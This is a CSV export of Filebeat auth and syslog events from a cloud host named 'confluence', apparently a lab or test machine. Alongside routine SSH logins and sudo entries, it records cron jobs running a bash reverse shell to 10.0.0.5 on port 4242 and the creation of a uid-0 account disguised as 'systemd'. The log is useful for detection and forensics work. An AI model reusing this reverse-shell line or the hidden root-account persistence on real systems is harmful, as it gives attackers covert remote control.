"@timestamp","_id","_index","_score","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version","cloud.account.id","cloud.availability_zone","cloud.instance.id","cloud.instance.name","cloud.machine.type","cloud.project.id","cloud.provider","cloud.service.name","ecs.version","event.action","event.category","event.dataset","event.ingested","event.kind","event.module","event.outcome","event.timezone","event.type","fileset.name","group.id","host.architecture","host.containerized","host.hostname","host.id","host.ip","host.mac","host.name","host.os.codename","host.os.family","host.os.kernel","host.os.name","host.os.name.text","host.os.platform","host.os.type","host.os.version","input.type","log.file.path","log.offset",message,"process.name","process.name.text","process.pid","related.hosts","related.ip","related.user","service.type","source.ip","source.port","system.auth.ssh.event","system.auth.ssh.method","system.auth.ssh.signature","system.auth.sudo.command","system.auth.sudo.pwd","system.auth.sudo.tty","system.auth.sudo.user","system.auth.useradd.home","system.auth.useradd.shell","user.effective.name","user.effective.name.text","user.id","user.name","user.name.text"
"Oct 26, 2022 @ 01:34:25.000",8Wk1EIQBiYLzbw6N6yTi,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:34:40.097",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","4,155","-",sudo,sudo,"-",confluence,"-","vagrant, root",system,"-","-","-","-","-","/bin/bash -l","/home/vagrant",unknown,root,"-","-",root,root,"-",vagrant,vagrant
"Oct 26, 2022 @ 01:34:24.000",Emk1EIQBiYLzbw6N2CBa,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","ssh_login","authentication, session","system.auth","Oct 26, 2022 @ 01:34:35.094",event,system,success,"+00:00","authentication_success, info",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","3,883","-",sshd,sshd,3148278,confluence,"172.17.0.1",vagrant,system,"172.17.0.1",45190,Accepted,publickey,"RSA SHA256:17fXQ8i0ddiZcCMZ0uU5DpWnmzLlTTHqIzAmgz29qAU","-","-","-","-","-","-","-","-","-",vagrant,vagrant
"Oct 26, 2022 @ 01:34:24.000",E2k1EIQBiYLzbw6N2CBa,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:34:35.096",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","4,044","-",sudo,sudo,"-",confluence,"-","vagrant, root",system,"-","-","-","-","-","/bin/bash -l","/home/vagrant",unknown,root,"-","-",root,root,"-",vagrant,vagrant
"Oct 26, 2022 @ 01:34:23.000",Omk1EIQBiYLzbw6NyB27,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:34:31.098",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","21,086","message repeated 3 times: [ Audit daemon rotating log files]",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:34:04.000",2Gk1EIQBiYLzbw6NehiY,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:34:11.095",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","21,010","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:34:01.000",YGk1EIQBiYLzbw6Nihk7,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:34:15.097",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","3,777","pam_unix(cron:session): session opened for user root by (uid=0)",CRON,CRON,3147297,confluence,"-",root,system,"-","-","-","-","-","-","-","-","-","-","-",root,root,0,"(empty)","(empty)"
"Oct 26, 2022 @ 01:34:01.000",Tmk1EIQBiYLzbw6NZxcN,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:34:06.092",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","20,885","(root) CMD (sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1')",CRON,CRON,3147298,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:33:58.000",0Wk1EIQBiYLzbw6NWxZV,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:34:03.092",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","20,809","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:33:51.000","hWk1EIQBiYLzbw6NUxZ-",".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:34:01.085",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","20,733","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:33:46.000",bWk1EIQBiYLzbw6NPBQR,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","ssh_login","authentication, session","system.auth","Oct 26, 2022 @ 01:33:55.084",event,system,success,"+00:00","authentication_success, info",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","3,394","-",sshd,sshd,3146735,confluence,"172.17.0.1",vagrant,system,"172.17.0.1",53692,Accepted,publickey,"RSA SHA256:17fXQ8i0ddiZcCMZ0uU5DpWnmzLlTTHqIzAmgz29qAU","-","-","-","-","-","-","-","-","-",vagrant,vagrant
"Oct 26, 2022 @ 01:33:46.000",bmk1EIQBiYLzbw6NPBQR,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:33:55.086",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","3,555","-",sudo,sudo,"-",confluence,"-","vagrant, root",system,"-","-","-","-","-","/bin/bash -l","/home/vagrant",unknown,root,"-","-",root,root,"-",vagrant,vagrant
"Oct 26, 2022 @ 01:33:46.000",pGk1EIQBiYLzbw6NPxT2,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:33:56.086",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","20,657","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:33:46.000",ZWk1EIQBiYLzbw6NTxWW,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:34:00.084",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","3,666","-",sudo,sudo,"-",confluence,"-","vagrant, root",system,"-","-","-","-","-","/bin/bash -l","/home/vagrant",unknown,root,"-","-",root,root,"-",vagrant,vagrant
"Oct 26, 2022 @ 01:33:40.000",o2k1EIQBiYLzbw6NPxT2,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:33:56.085",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","20,581","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:33:19.000",XWk0EIQBiYLzbw6Nygm6,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:33:26.073",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","20,505","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:33:01.000",0Gg0EIQBiYLzbw6NjPtV,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:33:10.084",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","20,380","(root) CMD (sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1')",CRON,CRON,3122513,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:33:01.000",sWk0EIQBiYLzbw6NnwLG,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:33:15.075",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","3,288","pam_unix(cron:session): session opened for user root by (uid=0)",CRON,CRON,3122512,confluence,"-",root,system,"-","-","-","-","-","-","-","-","-","-","-",root,root,0,"(empty)","(empty)"
"Oct 26, 2022 @ 01:32:44.000",z2g0EIQBiYLzbw6NjPtV,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:33:10.081",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","3,177","-",sudo,sudo,"-",confluence,"-","vagrant, root",system,"-","-","-","-","-","/bin/bash -l","/home/vagrant",unknown,root,"-","-",root,root,"-",vagrant,vagrant
"Oct 26, 2022 @ 01:32:43.000",JWg0EIQBiYLzbw6NKt6T,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","ssh_login","authentication, session","system.auth","Oct 26, 2022 @ 01:32:45.073",event,system,success,"+00:00","authentication_success, info",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","2,905","-",sshd,sshd,3122405,confluence,"172.17.0.1",vagrant,system,"172.17.0.1",57176,Accepted,publickey,"RSA SHA256:17fXQ8i0ddiZcCMZ0uU5DpWnmzLlTTHqIzAmgz29qAU","-","-","-","-","-","-","-","-","-",vagrant,vagrant
"Oct 26, 2022 @ 01:32:43.000",EGg0EIQBiYLzbw6NPuId,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:32:50.074",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","3,066","-",sudo,sudo,"-",confluence,"-","vagrant, root",system,"-","-","-","-","-","/bin/bash -l","/home/vagrant",unknown,root,"-","-",root,root,"-",vagrant,vagrant
"Oct 26, 2022 @ 01:32:39.000",Jmg0EIQBiYLzbw6NKt6T,".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:32:45.075",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","20,304","Audit daemon rotating log files",auditd,auditd,3118512,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:32:33.000","-mg0EIQBiYLzbw6ND906",".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.syslog","Oct 26, 2022 @ 01:32:38.066",event,system,"-","+00:00","-",syslog,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/syslog","20,173","(root) LIST (root)",crontab,crontab,3121982,confluence,"-","-",system,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 26, 2022 @ 01:32:33.000","-2g0EIQBiYLzbw6ND906",".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","ssh_login","authentication, session","system.auth","Oct 26, 2022 @ 01:32:38.067",event,system,success,"+00:00","authentication_success, info",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","2,075","-",sshd,sshd,3121932,confluence,"172.17.0.1",vagrant,system,"172.17.0.1",55270,Accepted,publickey,"RSA SHA256:17fXQ8i0ddiZcCMZ0uU5DpWnmzLlTTHqIzAmgz29qAU","-","-","-","-","-","-","-","-","-",vagrant,vagrant
"Oct 26, 2022 @ 01:32:33.000","_Gg0EIQBiYLzbw6ND906",".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:32:38.068",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","2,236","-",sudo,sudo,"-",confluence,"-","vagrant, root",system,"-","-","-","-","-","/bin/bash -l","/home/vagrant",unknown,root,"-","-",root,root,"-",vagrant,vagrant
"Oct 26, 2022 @ 01:32:33.000","_Wg0EIQBiYLzbw6ND906",".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-","-","system.auth","Oct 26, 2022 @ 01:32:38.069",event,system,"-","+00:00","-",auth,"-","x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","2,347","-",sudo,sudo,"-",confluence,"-","vagrant, root",system,"-","-","-","-","-","/bin/bash -l","/home/vagrant",unknown,root,"-","-",root,root,"-",vagrant,vagrant
"Oct 26, 2022 @ 01:32:33.000","_mg0EIQBiYLzbw6ND906",".ds-filebeat-8.3.3-2022.10.25-000001","-","8633d474-1dfd-4680-a062-a8b308de8498",confluence,"d57f3198-e7ed-4322-9593-d84bd11c92ae",confluence,filebeat,"8.3.3","trans-scheme-365615","asia-southeast1-b",2905371166466245354,test3204,"e2-standard-4","trans-scheme-365615",gcp,GCE,"1.12.0","-",iam,"system.auth","Oct 26, 2022 @ 01:32:38.070",event,system,success,"+00:00","user, creation",auth,0,"x86_64",false,confluence,9d46070389244c2781c14a6f68354f3e,"172.17.0.2, 10.0.0.3","02:42:0a:00:00:03, 02:42:ac:11:00:02",confluence,bionic,debian,"5.10.0-19-cloud-amd64",Ubuntu,Ubuntu,ubuntu,linux,"18.04.6 LTS (Bionic Beaver)",log,"/var/log/auth.log","2,458","-",useradd,useradd,3121966,confluence,"-",systemd,system,"-","-","-","-","-","-","-","-","-","/home/systemd","/bin/sh","-","-",0,systemd,systemd
